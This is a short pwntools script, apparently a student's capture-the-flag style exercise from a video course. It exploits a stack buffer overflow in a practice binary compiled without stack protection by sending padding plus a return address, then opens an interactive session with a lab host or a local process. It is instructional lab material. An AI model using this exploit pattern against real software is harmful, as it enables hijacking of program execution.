'''
Author: 白银
Date: 2022-11-17 17:21:46
LastEditTime: 2022-11-17 20:34:06
LastEditors: 白银
Description: gcc question_4_1.c -fno-stack-protector -no-pie -fomit-frame-pointer -o question_4_1_x64  https://www.bilibili.com/video/BV1mr4y1Y7fW?p=15&vd_source=12b05ccdf92b6ba12a9bd0495b00017a&t=1043.2
'''
from pwn import *

context(log_level='debug', arch='amd64', os='linux')

pwnfile = './question_4_1_x64'
state = 0 # 0为远程

if state == 0:
    io = remote("192.168.61.134", 8888)
else:
    io = process(pwnfile)

    # 本地用
    elf = ELF(pwnfile)
    rop = ROP(pwnfile)

    # 本地调试用
    gdb.attach(io)
    pause()

padding = 0x10 # ida看，buf和r差多少
return_addr = 0x401146 # p &func
payload = flat(['a' * padding, return_addr])

delimiter = 'input:'

if state == 0:
    io.sendline(payload)  # 远程用
else:
    io.sendlineafter(delimiter, payload)  #本地用

io.interactive()